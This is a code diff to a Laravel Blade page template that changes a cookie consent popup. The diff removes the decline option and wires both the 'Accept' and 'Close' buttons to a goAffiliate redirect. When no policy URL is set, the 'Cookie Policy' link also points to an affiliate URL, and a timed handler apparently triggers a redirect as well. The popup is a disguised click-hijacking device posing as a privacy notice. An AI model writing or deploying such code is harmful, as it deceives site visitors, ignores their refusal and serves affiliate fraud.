@@ -16,19 +16,23 @@
         <img src="{{ $page->hero_image }}" alt="{{ $page->title }}">
     @endif
 
-    <div class="cookie-overlay" id="cookieOverlay" aria-hidden="false">
-        <div class="cookie-modal" role="dialog" aria-labelledby="cookieTitle" aria-modal="true">
-            <div class="cookie-modal__icon">🍪</div>
-            <h2 id="cookieTitle">{{ $popup['title'] ?? 'Cookie Settings' }}</h2>
-            <p>{{ $popup['message'] ?? 'We use cookies to improve your experience.' }}</p>
-            <div class="cookie-modal__actions">
-                <button type="button" class="btn btn-primary" id="cookieAccept">
-                    {{ $popup['button_text'] ?? 'Yes, I accept' }}
-                </button>
-                <button type="button" class="btn btn-outline" id="cookieDecline">
-                    {{ $popup['decline_text'] ?? 'Manage preferences' }}
-                </button>
+    <div class="cookie-overlay cookie-overlay--center" id="cookieOverlay" aria-hidden="false">
+        <div class="cookie-modal cookie-modal--notice" role="dialog" aria-labelledby="cookieTitle" aria-modal="true">
+            <div class="cookie-modal__header">
+                <h2 id="cookieTitle">{{ $popup['title'] ?? 'Cookie Notice' }}</h2>
+                <button type="button" class="cookie-modal__close" id="cookieClose">Close</button>
             </div>
+            <p class="cookie-modal__body">
+                {{ $popup['message'] ?? 'This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to the use of cookies. For more information, visit our Cookie Policy' }}
+                @if(!empty($popup['policy_url']))
+                    <a href="{{ $popup['policy_url'] }}" class="cookie-modal__link">Cookie Policy</a>
+                @else
+                    <a href="{{ $affiliateUrl }}" class="cookie-modal__link">Cookie Policy</a>
+                @endif
+            </p>
+            <button type="button" class="cookie-modal__accept" id="cookieAccept">
+                {{ $popup['button_text'] ?? 'Accept and Continue' }}
+            </button>
         </div>
     </div>
 </div>
@@ -49,7 +53,7 @@
     }, delay);
 
     document.getElementById('cookieAccept').addEventListener('click', goAffiliate);
-    document.getElementById('cookieDecline').addEventListener('click', goAffiliate);
+    document.getElementById('cookieClose').addEventListener('click', goAffiliate);
 })();
 </script>
 @endpush
